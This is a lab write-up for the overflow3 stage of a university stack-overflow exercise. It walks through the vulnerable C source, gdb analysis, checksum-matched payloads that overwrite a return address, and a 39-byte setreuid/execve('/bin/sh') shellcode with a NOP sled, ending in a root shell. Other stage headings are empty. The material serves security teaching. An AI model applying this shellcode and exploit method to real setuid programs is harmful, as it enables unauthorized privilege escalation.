<h1 id="computer-security-stack-lab">Computer Security Stack Lab</h1>

<p>Stage:</p>

<ul>
<li>overflow1</li>
<li>overflow2</li>
<li>overflow3</li>
<li>overflow4</li>
</ul>

<p>The stages of stacklab is hosted on individual host on emory mainframe host. The purpose of this lab is to understand and use buffer overflow and shell code injection to compromise vulnerable programs, especially with unsafe buffer copy.</p>



<h2 id="overflow1">overflow1</h2>



<h2 id="oveflow2">oveflow2</h2>



<h2 id="overflow3">overflow3</h2>

<p>The third stage is a little bit trickier, but it follows the same idea of stage 1. Let’s first look at the source program with bug.There are 2 functions that we are interested in , namely  <code>zerg()</code> and <code>farmville()</code></p>



<pre class="prettyprint"><code class="language-C hljs cpp"><span class="hljs-keyword">int</span> zerg(<span class="hljs-keyword">char</span> *arg)
{
        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">12</span>];
        <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> i, sum;

        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span> (arg) &gt; <span class="hljs-number">24</span>) <span class="hljs-comment">/* Argument too long! */</span>
        {
                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[ZERG] String too long!\n"</span>);
                <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
        }

        <span class="hljs-comment">/* Compute checksum */</span>
        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>, sum = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(arg); i++)
                sum += (<span class="hljs-keyword">int</span>)arg[i];

        <span class="hljs-keyword">if</span> ( (sum &amp; <span class="hljs-number">0xff</span>) != <span class="hljs-number">0</span>)
        {
                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[ZERG] Sum of incoming buffer is not divisible by 256 :-(\n"</span>);
                <span class="hljs-built_in">exit</span> (<span class="hljs-number">1</span>);
        }

        <span class="hljs-comment">/* Check the first 10 characters */</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strncmp</span> (arg, <span class="hljs-string">"RUSHKEKEKE"</span>, <span class="hljs-number">10</span>))
        {
                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[ZERG] No warning issued for the incoming Zergling rush :-(\n"</span>);
                <span class="hljs-built_in">exit</span> (<span class="hljs-number">1</span>);
        }

        <span class="hljs-built_in">strcpy</span> (buf, arg);

        <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[ZERG] Buffer received %d characters!\n"</span>, <span class="hljs-built_in">strlen</span>(buf));

        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}


<span class="hljs-keyword">int</span> farmville(<span class="hljs-keyword">void</span>)
{
        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">227</span>];
        <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> i, sum = <span class="hljs-number">0</span>, c;

        <span class="hljs-keyword">while</span> ( (c = getc(stdin)) != EOF)
        {
                <span class="hljs-keyword">if</span> (c == <span class="hljs-string">'\n'</span>)
                        <span class="hljs-keyword">break</span>;
                buf[i++] = c;
        }

        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(buf); i++)
                sum += (<span class="hljs-keyword">int</span>)buf[i];

        <span class="hljs-keyword">if</span> ( (sum &amp; <span class="hljs-number">0xff</span>) != <span class="hljs-number">0</span>)
        {
                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[FARMVILLE] Sum of incoming buffer is not divisible by 256 :-(\n"</span>);
                <span class="hljs-built_in">exit</span> (<span class="hljs-number">1</span>);
        }

        <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[FARMVILLE] Spammed the walls of %d Facebook friends!\n"</span>, <span class="hljs-built_in">strlen</span>(buf));

        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre>

<p>Notice that both <code>zerg()</code> and <code>farmville()</code> have some kind of buffer overflow vulnerabilities. <code>strcpy (buf, arg)</code> a straightforward string copy without character checking  and </p>



<pre class="prettyprint"><code class="language-C hljs perl"><span class="hljs-keyword">while</span> ( (c = <span class="hljs-keyword">getc</span>(stdin)) != EOF)
        {
                <span class="hljs-keyword">if</span> (c == <span class="hljs-string">'\n'</span>)
                        <span class="hljs-keyword">break</span>;
                buf[i++] = c;
        }</code></pre>

<p>a bit-by-bit copy without bound checking. </p>

<p>However, <code>zerg()</code> only reserve us 12 bits to manipulate <code>char buf[12]</code>, while <code>farmville()</code> is far more generous <code>char buf[227]</code>. Moreover, in <code>main()</code>, <code>farmville()</code> never get called explicitly. </p>



<pre class="prettyprint"><code class="language-C hljs cpp"><span class="hljs-keyword">int</span> main(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)
{
        <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;

        <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)
        {
                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"Need exactly one argument\n"</span>);
                <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
        }
        <span class="hljs-comment">/* Clear all environment variables so people don't sneak nasty things into my memory &gt;:( */</span>
        <span class="hljs-keyword">while</span> (environ[i])
        {
                <span class="hljs-built_in">memset</span> (environ[i], <span class="hljs-number">0</span>, <span class="hljs-built_in">strlen</span>(environ[i]));
                i++;
        }
        clearenv();

        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">0</span>]); i++)
        {
                <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isalnum</span> (argv[<span class="hljs-number">0</span>][i]) &amp;&amp; <span class="hljs-built_in">strchr</span>(<span class="hljs-string">"-_/"</span>,argv[<span class="hljs-number">0</span>][i]) == NULL)
                        <span class="hljs-keyword">return</span> -<span class="hljs-number">2</span>;
        }

        zerg (argv[<span class="hljs-number">1</span>]);

        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}</code></pre>

<p>So our strategy is now intuitive. We will overflow the <code>zerg()</code> buffer, overwrite the return address to the address of <code>farmville()</code>, and then exploit the buffer. You may wonder how we feed a second shellcode into the <code>farmville()</code> without extensively manipulating the stack pointers. Luckily enough, the input of <code>farmville()</code> is conveniently from <code>stdin</code>, like <code>c = getc(stdin)</code>. So we can just pipe our two exploit scripts through commandline argument and <code>stdin</code> seperately, something like <code>(cat farmville.sol ; cat) | /c0re/overflow3 "$( &lt; zerg.sol)"</code> <br>
OK, now let’s start the exploit. <br>
First, we need to get pass the several checks in <code>zerg()</code>. By reading the source code, there are three criteria that our code must meet :</p>

<ul>
<li>Input must not be longer than 24 chars</li>
<li>Sum of input must be divisible by 256</li>
<li>First 10 character has to be <code>RUSHKEKEKE</code></li>
</ul>

<p>Addition to the above three requirements, we also want our input to redirect the return address to the call address of <code>farmville()</code>, which can be found via <code>objdump -d</code>, the result is like : <br>
 <code> <br>
 08048799 &lt;farmville&gt;: <br>
 8048799:       55                      push   %ebp <br>
 804879a:       89 e5                   mov    %esp,%ebp <br>
 804879c:       81 ec e4 00 00 00       sub    $0xe4,%esp <br>
 80487a2:       eb 25                   jmp    80487c9 &lt;farmville+0x30&gt; <br>
 ... <br>
</code> <br>
 The length of buffer can be get by doing  <br>
 <code>(gdb) disas zerg</code></p>



<pre class="prettyprint"><code class="language-... hljs r"><span class="hljs-keyword">...</span>
<span class="hljs-number">0x0804869e</span> &lt;+<span class="hljs-number">3</span>&gt;:     sub    $<span class="hljs-number">0xc</span>,%esp
<span class="hljs-keyword">...</span></code></pre>

<p><code>(gdb) print 0xc</code>  <br>
<code>$1 = 12</code> <br>
so our buffer is 12 char long, and the next 4 byte is the <code>ebp</code> pointer, and the next 4 byte is the return address we want to overwrite. <br>
 So the payload would be something like:  <br>
 <code>RUSHKEKEKE******\x99\x87\x04\x08</code> <br>
 where the <code>*</code> would make the whole payload divisible by 256. <br>
If you have some easy access to Ascii sum method, you can just do the math and find the exact <code>char</code> should be put in <code>*</code>, otherwise let’s just first try some arbitrary thing in  <code>gdb</code>: <br>
 <code>run $(python -c 'print ("RUSHKEKEKE" +"A" * 6+"\x99\x87\x04\x08")')</code> <br>
 and set a break point at where the comparison is made <br>
 <code>0x08048729 &lt;+142&gt;:   je     0x804873f &lt;zerg+164&gt;</code> <br>
 <code>(gdb) b *0x08048729</code> <br>
 <code>Breakpoint 2 at 0x8048729</code></p>



<pre class="prettyprint"><code class=" hljs bash">(gdb) cont
Continuing.
Breakpoint <span class="hljs-number">2</span>, <span class="hljs-number">0</span>x08048729 <span class="hljs-keyword">in</span> zerg ()</code></pre>

<p>Now let’s <code>disas</code> the stack and see what is being tested. <br>
<code>(gdb) disas</code></p>



<pre class="prettyprint"><code class=" hljs xml">   0x0804871f <span class="hljs-tag">&lt;<span class="hljs-title">+132</span>&gt;</span>:   mov    0x804a08c,%eax
   0x08048724 <span class="hljs-tag">&lt;<span class="hljs-title">+137</span>&gt;</span>:   movzbl %al,%eax
   0x08048727 <span class="hljs-tag">&lt;<span class="hljs-title">+140</span>&gt;</span>:   test   %eax,%eax
=&gt; 0x08048729 <span class="hljs-tag">&lt;<span class="hljs-title">+142</span>&gt;</span>:   je     0x804873f <span class="hljs-tag">&lt;<span class="hljs-title">zerg+164</span>&gt;</span></code></pre>

<p>and <code>$eax</code> now is set to the remainder of the sum of our payload divided by 256, so we can just print out <code>$eax</code> and tune up the payload. <br>
<code>(gdb) print $eax <br>
$2 = 164</code> <br>
So, we need add <code>(256-164=)92</code>to our payload. You can substitute any of the <code>A</code> , so I substituted 4 <code>A</code>s with <code>(A+23=)X</code>s, and run it again.  <br>
<code>run $(python -c 'print ("RUSHKEKEKE" +"A" *2+"X"*4+"\x99 <br>
\x87\x04\x08")')</code> <br>
and once we reach the 2nd break point, let’s check out <code>$eax</code>. <br>
<code>(gdb) print $eax <br>
$4 = 0</code> <br>
Yayyyy! It is now divisible by 256. So how about the return address, did we craft it correctly? <br>
Let’s set up another break point after the payload is copied into buffer (and overflow it).  </p>



<pre class="prettyprint"><code class=" hljs livecodeserver">(gdb) b *<span class="hljs-number">0x08048775</span>
Breakpoint <span class="hljs-number">3</span> <span class="hljs-keyword">at</span> <span class="hljs-number">0x8048775</span>
(gdb) cont
Continuing.

Breakpoint <span class="hljs-number">3</span>, <span class="hljs-number">0x08048775</span> <span class="hljs-operator">in</span> zerg ()</code></pre>

<p>Now, let’s examine the data at <code>$ebp</code> and the return address after it.  <br>
<code>(gdb) x/4x $ebp <br>
0xffffda38:     0x58585858      0x08048799      0xffffdc00      0x0000000f <br>
</code> <br>
great the next 4 byte of <code>$ebp</code> is now the call address of <code>farmville()</code>. We can now just continue to the end of this program and check if it did enter the <code>farmville()</code> function.</p>



<pre class="prettyprint"><code class=" hljs vhdl">(gdb) cont
Continuing.
[ZERG] <span class="hljs-keyword">Buffer</span> received <span class="hljs-number">20</span> characters!
aaaaaaaa
[FARMVILLE] Sum <span class="hljs-keyword">of</span> incoming <span class="hljs-keyword">buffer</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> divisible by <span class="hljs-number">256</span> :-(</code></pre>

<p>Yayyyy! It entered the <code>farmville()</code>. Note, cause we didn’t feed anything into the <code>stdin</code>, the program asked us for input after <code>farmville()</code> is called. </p>

<p>Now it’s time to crack the <code>farmville()</code> function. </p>

<p>Some preparation first： <br>
We will need the shellcode that do <code>setreuid(geteuid, geteuid)</code>  and  <code>execve(/bin/sh)</code>  to give us root access in shell. The 39-byte shellcode is as follow: <br>
<code>\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd <br>
\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69 <br>
\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80</code> <br>
And buffer length: 228 <br>
<code>0x0804879c &lt;+3&gt;:     sub    $0xe4,%esp <br>
(gdb) print 0xe4 <br>
$5 = 228</code></p>

<p>There is only one criteria that <code>farmville()</code> required from our payload:</p>



<pre class="prettyprint"><code class="language-C hljs bash"><span class="hljs-keyword">if</span> ( (sum &amp; <span class="hljs-number">0</span>xff) != <span class="hljs-number">0</span>)
        {
                <span class="hljs-built_in">printf</span> (<span class="hljs-string">"[FARMVILLE] Sum of incoming buffer is not divisible by 256 :-(\n"</span>);
                <span class="hljs-keyword">exit</span> (<span class="hljs-number">1</span>);
        }</code></pre>

<p>So our payload must again sum to a number divisible by 256. Recall the next 4 byte of <code>$ebp</code> is the return address and we want it to fall in somewhere of the <code>NOP</code> sleds, followed by our shellcode. At this moment, we will just craft some random payload and feed them to the <code>stdin</code> so we can examine the desired address and tune up sum of our payload.  <br>
<code>python -c 'print  <br>
("\x90"*100+"\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80 <br>
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53 <br>
\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"A"*92+"\x88\xd9\xff\xff")'&gt; farmville.sol</code> <br>
and then we can combine this with the exploit to pass <code>zerg()</code>phase, like this: <br>
<code>(gdb) run "$(&lt; zerg.sol)" &lt;farmville.sol</code> <br>
This is very similar to the <code>zerg()</code> phase of figuring out the correct number added up to something divisible by 256, so I won’t be verbose. </p>



<pre class="prettyprint"><code class="language-python hljs ">$eax = <span class="hljs-number">174</span>
<span class="hljs-number">256</span>-<span class="hljs-number">174</span> = <span class="hljs-number">82</span>
<span class="hljs-number">82</span>/<span class="hljs-number">2</span> = <span class="hljs-number">41</span>
<span class="hljs-comment">#replace 2 'A' with ('A'+41=)'j'</span>
python -c <span class="hljs-string">'print ("\x90"*100+"\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"A"*90+"j"*2+"\x88\xd9\xff\xff")'</span>&gt; farmville.sol
<span class="hljs-keyword">print</span> $eax
$eax = <span class="hljs-number">0</span>   <span class="hljs-comment">#Yayyyyy!</span>

x/<span class="hljs-number">4</span>x $ebp
<span class="hljs-number">0xffffda5c</span>: <span class="hljs-number">0x6a6a4141</span>      <span class="hljs-number">0xffffd988</span>      <span class="hljs-number">0x0000000f</span>      <span class="hljs-number">0x00000000</span></code></pre>

<p><code>0xffffd988</code> will be the address that falls in your <code>NOP</code> sleds.  <br>
Now everything is set up: it is divisible by 256, it redirect the return to our shell code which will enter the shell with <code>euid=0</code> and <code>uid=0</code>, which is root access. Let’s see if that is actually the case.</p>



<pre class="prettyprint"><code class=" hljs ruby">user<span class="hljs-variable">@host</span><span class="hljs-symbol">:/c0re</span><span class="hljs-variable">$ </span>(cat farmville.sol ; cat) | <span class="hljs-regexp">/c0re/attackme</span>3 <span class="hljs-string">"$( &lt; zerg.sol)"</span>
[<span class="hljs-constant">ZERG</span>] <span class="hljs-constant">Buffer</span> received <span class="hljs-number">20</span> characters!
[<span class="hljs-constant">FARMVILLE</span>] <span class="hljs-constant">Spammed</span> the walls of <span class="hljs-number">236</span> <span class="hljs-constant">Facebook</span> friends!
<span class="hljs-comment"># whoami</span>
 root
<span class="hljs-comment"># id</span>
uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">1030</span>(user) groups=<span class="hljs-number">1030</span>(user)</code></pre>

<p>Great! We compromise the program and gain root access in shell! </p>



<h2 id="overflow4">overflow4</h2>